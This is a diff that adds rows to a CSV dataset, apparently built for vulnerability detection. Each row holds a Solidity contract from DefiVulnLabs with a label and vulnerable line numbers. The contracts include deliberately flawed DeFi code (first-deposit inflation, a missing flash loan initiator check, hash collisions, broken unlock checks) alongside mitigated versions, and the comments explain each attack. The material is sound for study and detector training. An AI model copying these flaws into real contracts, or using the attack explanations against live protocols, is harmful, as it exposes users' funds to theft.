+        emit Transfer(from, to, tokensToTransfer);
+        emit Transfer(from, address(0), tokensToBurn);
+
+        return true;
+    }
+
+    function upAllowance(
+        address spender,
+        uint256 addedValue
+    ) public returns (bool) {
+        require(spender != address(0));
+        _allowed[msg.sender][spender] = (
+            _allowed[msg.sender][spender].add(addedValue)
+        );
+        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
+        return true;
+    }
+
+    function downAllowance(
+        address spender,
+        uint256 subtractedValue
+    ) public returns (bool) {
+        require(spender != address(0));
+        _allowed[msg.sender][spender] = (
+            _allowed[msg.sender][spender].sub(subtractedValue)
+        );
+        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
+        return true;
+    }
+
+    function _issue(address account, uint256 amount) internal {
+        require(amount != 0);
+        _balances[account] = _balances[account].add(amount);
+        emit Transfer(address(0), account, amount);
+    }
+
+    function destroy(uint256 amount) external {
+        _destroy(msg.sender, amount);
+    }
+
+    function _destroy(address account, uint256 amount) internal {
+        require(amount != 0);
+        require(amount <= _balances[account]);
+        _totalSupply = _totalSupply.sub(amount);
+        _balances[account] = _balances[account].sub(amount);
+        emit Transfer(account, address(0), amount);
+    }
+
+    function destroyFrom(address account, uint256 amount) external {
+        require(amount <= _allowed[account][msg.sender]);
+        _allowed[account][msg.sender] = _allowed[account][msg.sender].sub(
+            amount
+        );
+        _destroy(account, amount);
+    }
+}
+
+//vulnerable vault
+contract VulnVault {
+    mapping(address => uint256) private balances;
+    uint256 private fee;
+    IERC20 private token;
+
+    event Deposit(address indexed depositor, uint256 amount);
+    event Withdrawal(address indexed recipient, uint256 amount);
+
+    constructor(address _tokenAddress) {
+        token = IERC20(_tokenAddress);
+    }
+
+    function deposit(uint256 amount) external {
+        require(amount > 0, ""Deposit amount must be greater than zero"");
+
+        token.transferFrom(msg.sender, address(this), amount);
+        balances[msg.sender] += amount;
+        emit Deposit(msg.sender, amount);
+    }
+
+    function withdraw(uint256 amount) external {
+        require(amount > 0, ""Withdrawal amount must be greater than zero"");
+        require(amount <= balances[msg.sender], ""Insufficient balance"");
+
+        balances[msg.sender] -= amount;
+        token.transfer(msg.sender, amount);
+        emit Withdrawal(msg.sender, amount);
+    }
+
+    function getBalance(address account) external view returns (uint256) {
+        return balances[account];
+    }
+}
+
+//Mitigated vault
+contract Vault {
+    mapping(address => uint256) private balances;
+    uint256 private fee;
+    IERC20 private token;
+
+    event Deposit(address indexed depositor, uint256 amount);
+    event Withdrawal(address indexed recipient, uint256 amount);
+
+    constructor(address _tokenAddress) {
+        token = IERC20(_tokenAddress);
+    }
+
+    function deposit(uint256 amount) external {
+        require(amount > 0, ""Deposit amount must be greater than zero"");
+
+        uint256 balanceBefore = token.balanceOf(address(this));
+
+        token.transferFrom(msg.sender, address(this), amount);
+
+        uint256 balanceAfter = token.balanceOf(address(this));
+        uint256 actualDepositAmount = balanceAfter - balanceBefore;
+
+        balances[msg.sender] += actualDepositAmount;
+        emit Deposit(msg.sender, actualDepositAmount);
+    }
+
+    function withdraw(uint256 amount) external {
+        require(amount > 0, ""Withdrawal amount must be greater than zero"");
+        require(amount <= balances[msg.sender], ""Insufficient balance"");
+
+        balances[msg.sender] -= amount;
+        token.transfer(msg.sender, amount);
+        emit Withdrawal(msg.sender, amount);
+    }
+
+    function getBalance(address account) external view returns (uint256) {
+        return balances[account];
+    }
+}
+","{270, 271}"
+13,13,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\first-deposit_modified.sol,1,first-deposit_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.15;
+
+import ""@openzeppelin/contracts/token/ERC20/ERC20.sol"";
+import ""@openzeppelin/contracts/access/Ownable.sol"";
+
+/*
+
+Name: First deposit bug
+
+Description:
+First pool depositor can be front-run and have part of their deposit stolen
+In this case, we can control the variable ""_supplied."" 
+By depositing a small amount of loan tokens to obtain pool tokens, 
+we can front-run other depositors' transactions and inflate the price of pool tokens through a substantial ""donation.""
+Consequently, the attacker can withdraw a greater quantity of loan tokens than they initially possessed.
+
+This calculation issue arises because, in Solidity, if the pool token value for a user becomes less than 1,
+it is essentially rounded down to 0.
+
+Mitigation:  
+Consider minting a minimal amount of pool tokens during the first deposit 
+and sending them to zero address, this increases the cost of the attack. 
+Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address. 
+The same can be done in this case i.e. when totalSupply() == 0, 
+send the first min liquidity LP tokens to the zero address to enable share dilution.
+
+REF:
+https://defihacklabs.substack.com/p/solidity-security-lesson-2-first
+https://github.com/sherlock-audit/2023-02-surge-judging/issues/1
+https://github.com/transmissions11/solmate/issues/178
+*/
+
+/*
+ * @vulnerable_at_lines: 67, 88
+ */
+
+contract MyToken is ERC20, Ownable {
+    constructor() ERC20(""MyToken"", ""MTK"") {
+        _mint(msg.sender, 10000 * 10 ** decimals());
+    }
+
+    function mint(address to, uint256 amount) public onlyOwner {
+        _mint(to, amount);
+    }
+}
+
+contract SimplePool {
+    IERC20 public loanToken;
+    uint public totalShares;
+
+    mapping(address => uint) public balanceOf;
+
+    constructor(address _loanToken) {
+        loanToken = IERC20(_loanToken);
+    }
+
+    function deposit(uint amount) external {
+        require(amount > 0, ""Amount must be greater than zero"");
+
+        uint _shares;
+        if (totalShares == 0) {
+            _shares = amount;
+        } else {
+            _shares = tokenToShares(
+                amount,
+                loanToken.balanceOf(address(this)),
+                totalShares,
+                false
+            );
+        }
+
+        require(
+            loanToken.transferFrom(msg.sender, address(this), amount),
+            ""TransferFrom failed""
+        );
+        balanceOf[msg.sender] += _shares;
+        totalShares += _shares;
+    }
+
+    function tokenToShares(
+        uint _tokenAmount,
+        uint _supplied,
+        uint _sharesTotalSupply,
+        bool roundUpCheck
+    ) internal pure returns (uint) {
+        if (_supplied == 0) return _tokenAmount;
+        uint shares = (_tokenAmount * _sharesTotalSupply) / _supplied;
+        if (
+            roundUpCheck &&
+            shares * _supplied < _tokenAmount * _sharesTotalSupply
+        ) shares++;
+        return shares;
+    }
+
+    function withdraw(uint shares) external {
+        require(shares > 0, ""Shares must be greater than zero"");
+        require(balanceOf[msg.sender] >= shares, ""Insufficient balance"");
+
+        uint tokenAmount = (shares * loanToken.balanceOf(address(this))) /
+            totalShares;
+
+        balanceOf[msg.sender] -= shares;
+        totalShares -= shares;
+
+        require(loanToken.transfer(msg.sender, tokenAmount), ""Transfer failed"");
+    }
+}
+","{88, 67}"
+14,14,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Flashloan-flaw_modified.sol,1,Flashloan-flaw_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+import ""@openzeppelin/contracts/token/ERC20/ERC20.sol"";
+import ""@openzeppelin/contracts/access/Ownable.sol"";
+import ""@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol"";
+
+/*
+Name: Missing flash loan initiator check
+
+Description:
+Missing flash loan initiator check refers to a potential security vulnerability in a flash loan implementation 
+where the initiator of the flash loan is not properly verified or checked, anyone could exploit the flash loan 
+functionality and set the receiver address to a vulnerable protocol.
+  
+By doing so, an attacker could potentially manipulate balances, open trades, drain funds, 
+or carry out other malicious actions within the vulnerable protocol. 
+This poses significant risks to the security and integrity of the protocol and its users.
+
+Mitigation:  
+Check the initiator of the flash loan and revert if the initiator is not authorized.
+
+REF:
+https://twitter.com/ret2basic/status/1681150722434551809
+https://github.com/sherlock-audit/2023-05-dodo-judging/issues/34
+*/
+
+/*
+ * @vulnerable_at_lines: 64, 139
+ */
+
+contract SimpleBankBug {
+    using SafeERC20 for IERC20;
+    IERC20 public USDa;
+    LendingPool public lendingPool;
+
+    constructor(address _lendingPoolAddress, address _asset) {
+        lendingPool = LendingPool(_lendingPoolAddress);
+        USDa = IERC20(_asset);
+    }
+
+    function flashLoan(
+        uint256 amounts,
+        address receiverAddress,
+        bytes calldata data
+    ) external {
+        receiverAddress = address(this);
+
+        lendingPool.flashLoan(amounts, receiverAddress, data);
+    }
+
+    function executeOperation(
+        uint256 amounts,
+        address receiverAddress,
+        address _initiator,
+        bytes calldata data
+    ) external {
+        /* Perform your desired logic here
+        Open opsition, close opsition, drain funds, etc.
+        _closetrade(...) or _opentrade(...)
+        */
+
+        // transfer all borrowed assets back to the lending pool
+        IERC20(USDa).safeTransfer(address(lendingPool), amounts);
+    }
+}
+
+contract FixedSimpleBank {
+    using SafeERC20 for IERC20;
+    IERC20 public USDa;
+    LendingPool public lendingPool;
+
+    constructor(address _lendingPoolAddress, address _asset) {
+        lendingPool = LendingPool(_lendingPoolAddress);
+        USDa = IERC20(_asset);
+    }
+
+    function flashLoan(
+        uint256 amounts,
+        address receiverAddress,
+        bytes calldata data
+    ) external {
+        address receiverAddress = address(this);
+
+        lendingPool.flashLoan(amounts, receiverAddress, data);
+    }
+
+    function executeOperation(
+        uint256 amounts,
+        address receiverAddress,
+        address _initiator,
+        bytes calldata data
+    ) external {
+        // Mitigation: make sure to check the initiator
+        require(_initiator == address(this), ""Unauthorized"");
+
+        // transfer all borrowed assets back to the lending pool
+        IERC20(USDa).safeTransfer(address(lendingPool), amounts);
+    }
+}
+
+contract USDa is ERC20, Ownable {
+    constructor() ERC20(""USDA"", ""USDA"") {
+        _mint(msg.sender, 10000 * 10 ** decimals());
+    }
+
+    function mint(address to, uint256 amount) public onlyOwner {
+        _mint(to, amount);
+    }
+}
+
+interface IFlashLoanReceiver {
+    function executeOperation(
+        uint256 amounts,
+        address receiverAddress,
+        address _initiator,
+        bytes calldata data
+    ) external;
+}
+
+contract LendingPool {
+    IERC20 public USDa;
+
+    constructor(address _USDA) {
+        USDa = IERC20(_USDA);
+    }
+
+    function flashLoan(
+        uint256 amount,
+        address borrower,
+        bytes calldata data
+    ) public {
+        uint256 balanceBefore = USDa.balanceOf(address(this));
+        require(balanceBefore >= amount, ""Not enough liquidity"");
+        require(USDa.transfer(borrower, amount), ""Flashloan transfer failed"");
+        IFlashLoanReceiver(borrower).executeOperation(
+            amount,
+            borrower,
+            msg.sender,
+            data
+        );
+
+        uint256 balanceAfter = USDa.balanceOf(address(this));
+        require(balanceAfter >= balanceBefore, ""Flashloan not repaid"");
+    }
+}
+","{64, 139}"
+15,15,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\gas-price_modified.sol,1,gas-price_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+/*
+Name: txGasPrice manipulation
+
+Description:
+Manipulation of the txGasPrice value, which can result in unintended consequences and potential financial losses.
+
+In the calculateTotalFee function, the total fee is calculated by multiplying gasUsed + GAS_OVERHEAD_NATIVE with txGasPrice. 
+The issue is that the txGasPrice value can be manipulated by an attacker, potentially leading to an inflated fee calculation.
+
+Mitigation:  
+To address this vulnerability, it is recommended to implement safeguards such as using a gas oracle to obtain the average gas price from a trusted source. 
+
+Test:
+forge test --contracts src/test/gas-price.sol  -vvvv --gas-price 200000000000000
+
+REF:
+https://twitter.com/1nf0s3cpt/status/1678268482641870849
+https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-03-21-Alligator.md
+https://github.com/solodit/solodit_content/blob/main/reports/Trust%20Security/2023-05-15-Brahma.md
+https://blog.pessimistic.io/ethereum-alarm-clock-exploit-final-thoughts-21334987c331
+*/
+
+/*
+ * @vulnerable_at_lines: 37
+ */
+
+contract GasReimbursement {
+    uint public gasUsed = 100000; // Assume gas used is 100,000
+    uint public GAS_OVERHEAD_NATIVE = 500; // Assume native token gas overhead is 500
+
+    // uint public txGasPrice = 20000000000;  // Assume transaction gas price is 20 gwei
+
+    function calculateTotalFee() public view returns (uint) {
+        uint256 totalFee = (gasUsed + GAS_OVERHEAD_NATIVE) * tx.gasprice;
+        return totalFee;
+    }
+
+    function executeTransfer(address recipient) public {
+        uint256 totalFee = calculateTotalFee();
+        _nativeTransferExec(recipient, totalFee);
+    }
+
+    function _nativeTransferExec(address recipient, uint256 amount) internal {
+        payable(recipient).transfer(amount);
+    }
+}
+",{37}
+16,16,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Hash-collisions_modified.sol,1,Hash-collisions_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.15;
+
+/*
+Name: abi.encodePacked() Hash Collisions
+
+Description:
+Using abi.encodePacked() with multiple variable length arguments can, 
+in certain situations, lead to a hash collision.
+
+Hash functions are designed to be unique for each input, 
+but collisions can still occur due to limitations in the hash function's size or the sheer number of possible inputs. 
+This is a known issue mentioned:
+https://docs.soliditylang.org/en/v0.8.17/abi-spec.html?highlight=collisions#non-standard-packed-mode
+
+In deposit function allows users to deposit Ether into the contract based on two string inputs: _string1 and _string2. 
+The contract uses the keccak256 function to generate a unique hash by concatenating these two strings.
+
+If two different combinations of _string1 and _string2 produce the same hash value, a hash collision will occur. 
+The code does not handle this scenario properly and allows the second depositor to overwrite the previous deposit.
+
+Mitigation: 
+use of abi.encode() instead of abi.encodePacked()
+
+REF:
+https://twitter.com/1nf0s3cpt/status/1676476475191750656
+https://docs.soliditylang.org/en/v0.8.17/abi-spec.html?highlight=collisions#non-standard-packed-mode
+https://swcregistry.io/docs/SWC-133
+https://github.com/sherlock-audit/2022-10-nftport-judging/issues/118
+*/
+
+/*
+ * @vulnerable_at_lines: 43, 56
+ */
+
+contract HashCollisionBug {
+    mapping(bytes32 => uint256) public balances;
+
+    function createHash(
+        string memory _string1,
+        string memory _string2
+    ) public pure returns (bytes32) {
+        return keccak256(abi.encodePacked(_string1, _string2));
+    }
+
+    function deposit(
+        string memory _string1,
+        string memory _string2
+    ) external payable {
+        require(msg.value > 0, ""Deposit amount must be greater than zero"");
+
+        bytes32 hash = createHash(_string1, _string2);
+        // createHash(AAA, BBB) -> AAABBB
+        // createHash(AA, ABBB) -> AAABBB
+        // Check if the hash already exists in the balances mapping
+        require(balances[hash] == 0, ""Hash collision detected"");
+
+        balances[hash] = msg.value;
+    }
+}
+","{56, 43}"
+17,17,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Immunefi_ch1_modified.sol,1,Immunefi_ch1_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+import ""@openzeppelin/contracts/token/ERC721/ERC721.sol"";
+import ""@openzeppelin/contracts/access/Ownable.sol"";
+import ""@openzeppelin/contracts/utils/Counters.sol"";
+
+// Immunefi #spotthebugchallenge!
+// https://twitter.com/immunefi/status/1557301712549023745
+
+/*
+ * @vulnerable_at_lines: 32, 33
+ */
+
+contract HerToken is ERC721, Ownable, Test {
+    uint128 constant MINT_PRICE = 1 ether;
+    uint128 constant MAX_SUPPLY = 10000;
+    uint mintIndex;
+    using Counters for Counters.Counter;
+    Counters.Counter private _tokenIdCounter;
+
+    constructor() payable ERC721(""HarToken"", ""HRT"") {}
+
+    function safeMint(address to, uint256 amount) public payable {
+        require(
+            _tokenIdCounter.current() + amount < MAX_SUPPLY,
+            ""Cannot mint given amount.""
+        );
+        require(amount > 0, ""Must give a mint amount."");
+        //fix require(msg.value >= MINT_PRICE * amount, ""Insufficient Ether."");
+        // before the loop
+        for (uint256 i = 0; i < amount; i++) {
+            require(msg.value >= MINT_PRICE, ""Insufficient Ether."");
+
+            mintIndex = _tokenIdCounter.current();
+            console.log(""mintIndex"", mintIndex);
+            _safeMint(to, mintIndex); // no reentrancy issue, because we can not control tokenid.
+            _tokenIdCounter.increment();
+        }
+    }
+
+    function safeMintMitigated(address to, uint256 amount) public payable {
+        require(
+            _tokenIdCounter.current() + amount < MAX_SUPPLY,
+            ""Cannot mint given amount.""
+        );
+        require(amount > 0, ""Must give a mint amount."");
+        //fix require(msg.value >= MINT_PRICE * amount, ""Insufficient Ether."");
+        // before the loop
+        require(msg.value >= MINT_PRICE * amount, ""Insufficient Ether."");
+        for (uint256 i = 0; i < amount; i++) {
+            //require(msg.value >= MINT_PRICE, ""Insufficient Ether."");
+
+            mintIndex = _tokenIdCounter.current();
+            console.log(""mintIndex"", mintIndex);
+            _safeMint(to, mintIndex); // no reentrancy issue, because we can not control tokenid.
+            _tokenIdCounter.increment();
+        }
+    }
+}
+","{32, 33}"
+18,18,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Immunefi_ch2_modified.sol,1,Immunefi_ch2_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+import ""@openzeppelin/contracts/utils/Address.sol"";
+import ""@openzeppelin/contracts/utils/StorageSlot.sol"";
+import ""@openzeppelin/contracts/access/Ownable.sol"";
+import ""@openzeppelin/contracts/proxy/utils/Initializable.sol"";
+
+//#SpotTheBugChallenge
+//https://twitter.com/immunefi/status/1562858386244665348?s=21&t=d7_HtNra5AGuNmzVtv9uKg
+
+/*
+ * @vulnerable_at_lines: 22
+ */
+
+interface imp {
+    function initialize(address) external;
+}
+
+contract Proxy {
+    //bytes32 constant internal _IMPLEMENTATION_SLOT = keccak256(""where.bug.ser"");  //correct pattern.
+    bytes32 internal _IMPLEMENTATION_SLOT = keccak256(""where.bug.ser""); // wrong
+
+    constructor(address implementation) {
+        _setImplementation(address(0));
+        Address.functionDelegateCall(
+            implementation,
+            abi.encodeWithSignature(""initialize(address)"", msg.sender)
+        );
+    }
+
+    fallback() external payable {
+        address implementation = _getImplementation();
+        Address.functionDelegateCall(implementation, msg.data);
+    }
+
+    function _setImplementation(address newImplementation) private {
+        //require(Address.isContract(newImplementation), ""ERC1967: new implementation is not a contract"");
+        StorageSlot
+            .getAddressSlot(_IMPLEMENTATION_SLOT)
+            .value = newImplementation;
+    }
+
+    function _getImplementation() public view returns (address) {
+        return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;
+    }
+}
+
+contract ProxyMitigated {
+    bytes32 constant internal _IMPLEMENTATION_SLOT = keccak256(""where.bug.ser"");  //correct pattern.
+    //bytes32 internal _IMPLEMENTATION_SLOT = keccak256(""where.bug.ser""); // wrong
+
+    constructor(address implementation) {
+        _setImplementation(address(0));
+        Address.functionDelegateCall(
+            implementation,
+            abi.encodeWithSignature(""initialize(address)"", msg.sender)
+        );
+    }
+
+    fallback() external payable {
+        address implementation = _getImplementation();
+        Address.functionDelegateCall(implementation, msg.data);
+    }
+
+    function _setImplementation(address newImplementation) private {
+        //require(Address.isContract(newImplementation), ""ERC1967: new implementation is not a contract"");
+        StorageSlot
+            .getAddressSlot(_IMPLEMENTATION_SLOT)
+            .value = newImplementation;
+    }
+
+    function _getImplementation() public view returns (address) {
+        return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;
+    }
+}
+
+contract Implementation is Ownable, Initializable {
+    // function initialize(address owner) external {    //test purpose
+    function initialize(address owner) external initializer {
+        _transferOwnership(owner);
+    }
+}
+",{22}
+19,19,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\Incorrect_sanity_checks_modified.sol,1,Incorrect_sanity_checks_modified.sol,0,"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+import ""@openzeppelin/contracts/token/ERC20/ERC20.sol"";
+import ""@openzeppelin/contracts/access/Ownable.sol"";
+
+/*
+Name: Incorrect sanity checks - Multiple Unlocks Before Lock Time Elapse 
+
+Description:
+The bug lies in the unlockToken function, which lacks a check to ensure that block.timestamp is larger than locktime. 
+This allows tokens to be unlocked multiple times before the lock period has elapsed, 
+potentially leading to significant financial loss.
+ 
+Mitigation:  
+Add a require statement to check that the current time is greater than the lock time before the tokens can be unlocked.
+
+or fix:
+uint256 amount = locker.amount;
+if (block.timestamp > locker.lockTime) {
+    IERC20(locker.tokenAddress).transfer(msg.sender, amount);
+    locker.amount = 0;
+    }
+
+REF:
+https://twitter.com/1nf0s3cpt/status/1681492477281468420
+https://blog.decurity.io/dx-protocol-vulnerability-disclosure-bddff88aeb1d
+*/
+
+/*
+ * @vulnerable_at_lines: 77, 78, 79
+ */
+
+contract VulnerableBank {
+    struct Locker {
+        bool hasLockedTokens;
+        uint256 amount;
+        uint256 lockTime;
+        address tokenAddress;
+    }
+
+    mapping(address => mapping(uint256 => Locker)) private _unlockToken;
+    uint256 private _nextLockerId = 1;
+
+    function createLocker(
+        address tokenAddress,
+        uint256 amount,
+        uint256 lockTime
+    ) public {
+        require(amount > 0, ""Amount must be greater than 0"");
+        require(lockTime > block.timestamp, ""Lock time must be in the future"");
+        require(
+            IERC20(tokenAddress).balanceOf(msg.sender) >= amount,
+            ""Insufficient token balance""
+        );
+
+        // Transfer the tokens to this contract
+        IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount);
+
+        // Create the locker
+        Locker storage locker = _unlockToken[msg.sender][_nextLockerId];
+        locker.hasLockedTokens = true;
+        locker.amount = amount;
+        locker.lockTime = lockTime;
+        locker.tokenAddress = tokenAddress;
+
+        _nextLockerId++;
+    }
+
+    function unlockToken(uint256 lockerId) public {
+        Locker storage locker = _unlockToken[msg.sender][lockerId];
+        // Save the amount to a local variable
+        uint256 amount = locker.amount;
+        require(locker.hasLockedTokens, ""No locked tokens"");
+
+        // Incorrect sanity checks.
+        if (block.timestamp > locker.lockTime) {
+            locker.amount = 0;
+        }
+
+        // Transfer tokens to the locker owner
+        // This is where the exploit happens, as this can be called multiple times
+        // before the lock time has elapsed.
+        IERC20(locker.tokenAddress).transfer(msg.sender, amount);
+    }
+}
+
+contract BanksLP is ERC20, Ownable {
+    constructor() ERC20(""BanksLP"", ""BanksLP"") {
+        _mint(msg.sender, 10000 * 10 ** decimals());
+    }
+
+    function mint(address to, uint256 amount) public onlyOwner {
+        _mint(to, amount);
+    }
+}
+
+contract FixedeBank {
+    struct Locker {
+        bool hasLockedTokens;
+        uint256 amount;
+        uint256 lockTime;
+        address tokenAddress;
+    }
+
+    mapping(address => mapping(uint256 => Locker)) private _unlockToken;
+    uint256 private _nextLockerId = 1;
+
+    function createLocker(
+        address tokenAddress,
+        uint256 amount,
+        uint256 lockTime
+    ) public {
+        require(amount > 0, ""Amount must be greater than 0"");
+        require(lockTime > block.timestamp, ""Lock time must be in the future"");
+        require(
+            IERC20(tokenAddress).balanceOf(msg.sender) >= amount,
+            ""Insufficient token balance""
+        );
+
+        // Transfer the tokens to this contract
+        IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount);
+
+        // Create the locker
+        Locker storage locker = _unlockToken[msg.sender][_nextLockerId];
+        locker.hasLockedTokens = true;
+        locker.amount = amount;
+        locker.lockTime = lockTime;
+        locker.tokenAddress = tokenAddress;
+
+        _nextLockerId++;
+    }
+
+    function unlockToken(uint256 lockerId) public {
+        Locker storage locker = _unlockToken[msg.sender][lockerId];
+
+        require(locker.hasLockedTokens, ""No locked tokens"");
+        require(block.timestamp > locker.lockTime, ""Tokens are still locked"");
+        // Save the amount to a local variable
+        uint256 amount = locker.amount;
+
+        // Mark the tokens as unlocked
+        locker.hasLockedTokens = false;
+        locker.amount = 0;
+
+        // Transfer tokens to the locker owner
+        IERC20(locker.tokenAddress).transfer(msg.sender, amount);
+    }
+}
+","{77, 78, 79}"
+20,20,D:\UoM\Final_Year_Project_New\vulnerability-detection-and-localization\datasets\DefiVulnLabs\src\test\interface_modified.sol,-1,interface_modified.sol,1,"// SPDX-License-Identifier: UNLICENSED
+
+pragma solidity 0.8.18;
+
+/*
+ * @vulnerable_at_lines: -1
+ */
+
+interface CheatCodes {
+    // This allows us to getRecordedLogs()
+    struct Log {
+        bytes32[] topics;
+        bytes data;
+    }
+
+    // Set block.timestamp (newTimestamp)
+    function warp(uint256) external;
+
+    // Set block.height (newHeight)
+    function roll(uint256) external;
+
+    // Set block.basefee (newBasefee)
+    function fee(uint256) external;
+
+    // Set block.coinbase (who)
+    function coinbase(address) external;
+
+    // Loads a storage slot from an address (who, slot)
+    function load(address, bytes32) external returns (bytes32);
+
+    // Stores a value to an address' storage slot, (who, slot, value)
+    function store(address, bytes32, bytes32) external;
+
+    // Signs data, (privateKey, digest) => (v, r, s)
+    function sign(uint256, bytes32) external returns (uint8, bytes32, bytes32);
+
+    // Gets address for a given private key, (privateKey) => (address)
+    function addr(uint256) external returns (address);
+
+    // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}
+    function deriveKey(string calldata, uint32) external returns (uint256);
+
+    // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}
+    function deriveKey(
+        string calldata,
+        string calldata,
+        uint32
+    ) external returns (uint256);
+
+    // Performs a foreign function call via terminal, (stringInputs) => (result)
+    function ffi(string[] calldata) external returns (bytes memory);
+
+    // Set environment variables, (name, value)
+    function setEnv(string calldata, string calldata) external;
+
+    // Read environment variables, (name) => (value)
+    function envBool(string calldata) external returns (bool);
+
+    function envUint(string calldata) external returns (uint256);
+
+    function envInt(string calldata) external returns (int256);
+
+    function envAddress(string calldata) external returns (address);
+
+    function envBytes32(string calldata) external returns (bytes32);
+
+    function envString(string calldata) external returns (string memory);
+
+    function envBytes(string calldata) external returns (bytes memory);
+
+    // Read environment variables as arrays, (name, delim) => (value[])
+    function envBool(
+        string calldata,
+        string calldata
+    ) external returns (bool[] memory);
+
+    function envUint(
+        string calldata,
+        string calldata
+    ) external returns (uint256[] memory);
+
+    function envInt(
+        string calldata,
+        string calldata
+    ) external returns (int256[] memory);
+
+    function envAddress(
+        string calldata,
+        string calldata
+    ) external returns (address[] memory);
+
+    function envBytes32(
+        string calldata,
+        string calldata
+    ) external returns (bytes32[] memory);
+
+    function envString(
+        string calldata,
+        string calldata
+    ) external returns (string[] memory);
+
+    function envBytes(
+        string calldata,
+        string calldata
+    ) external returns (bytes[] memory);
+
+    // Sets the *next* call's msg.sender to be the input address
+    function prank(address) external;
+
+    // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called
+    function startPrank(address) external;
+
+    // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input
+    function prank(address, address) external;
+
+    // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input
+    function startPrank(address, address) external;
+
+    // Resets subsequent calls' msg.sender to be `address(this)`
+    function stopPrank() external;
+
+    // Sets an address' balance, (who, newBalance)
+    function deal(address, uint256) external;
+
+    // Sets an address' code, (who, newCode)
+    function etch(address, bytes calldata) external;
+
+    // Expects an error on next call
+    function expectRevert() external;
+
+    function expectRevert(bytes calldata) external;
+
+    function expectRevert(bytes4) external;
+
+    // Record all storage reads and writes
+    function record() external;
+
+    // Gets all accessed reads and write slot from a recording session, for a given address
+    function accesses(
+        address
+    ) external returns (bytes32[] memory reads, bytes32[] memory writes);
+
+    // Record all the transaction logs
+    function recordLogs() external;
+
+    // Gets all the recorded logs
+    function getRecordedLogs() external returns (Log[] memory);
+
+    // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).
+    // Call this function, then emit an event, then call a function. Internally after the call, we check if
+    // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).
+    // Second form also checks supplied address against emitting contract.
+    function expectEmit(bool, bool, bool, bool) external;
+
+    function expectEmit(bool, bool, bool, bool, address) external;
+
+    // Mocks a call to an address, returning specified data.
+    // Calldata can either be strict or a partial match, e.g. if you only
+    // pass a Solidity selector to the expected calldata, then the entire Solidity
+    // function will be mocked.
+    function mockCall(address, bytes calldata, bytes calldata) external;
+
+    // Mocks a call to an address with a specific msg.value, returning specified data.
+    // Calldata match takes precedence over msg.value in case of ambiguity.
+    function mockCall(
+        address,
+        uint256,
+        bytes calldata,
+        bytes calldata
+    ) external;
+
+    // Clears all mocked calls
+    function clearMockedCalls() external;
+
+    // Expect a call to an address with the specified calldata.
+    // Calldata can either be strict or a partial match
+    function expectCall(address, bytes calldata) external;
+
+    // Expect a call to an address with the specified msg.value and calldata
+    function expectCall(address, uint256, bytes calldata) external;
+
+    // Gets the code from an artifact file. Takes in the relative path to the json file
+    function getCode(string calldata) external returns (bytes memory);
+
+    // Labels an address in call traces
+    function label(address, string calldata) external;
+
+    // If the condition is false, discard this run's fuzz inputs and generate new ones
+    function assume(bool) external;
+
+    // Set nonce for an account
+    function setNonce(address, uint64) external;
+
+    // Get nonce for an account
+    function getNonce(address) external returns (uint64);
+
+    // Set block.chainid (newChainId)
+    function chainId(uint256) external;
+
+    // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain
+    function broadcast() external;
+
+    // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain
+    function broadcast(address) external;
+
+    // Using the address that calls the test contract, has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain
+    function startBroadcast() external;
+
+    // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain
+    function startBroadcast(address) external;
+
+    // Stops collecting onchain transactions
+    function stopBroadcast() external;
+
+    // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)
+    function readFile(string calldata) external returns (string memory);
+
+    // Reads next line of file to string, (path) => (line)
+    function readLine(string calldata) external returns (string memory);
+
+    // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.
+    // Path is relative to the project root. (path, data) => ()
+    function writeFile(string calldata, string calldata) external;
+
+    // Writes line to file, creating a file if it does not exist.
+    // Path is relative to the project root. (path, data) => ()
+    function writeLine(string calldata, string calldata) external;
+
+    // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.
+    // Path is relative to the project root. (path) => ()
+    function closeFile(string calldata) external;
+
+    // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:
+    // - Path points to a directory.
+    // - The file doesn't exist.
+    // - The user lacks permissions to remove the file.
+    // Path is relative to the project root. (path) => ()
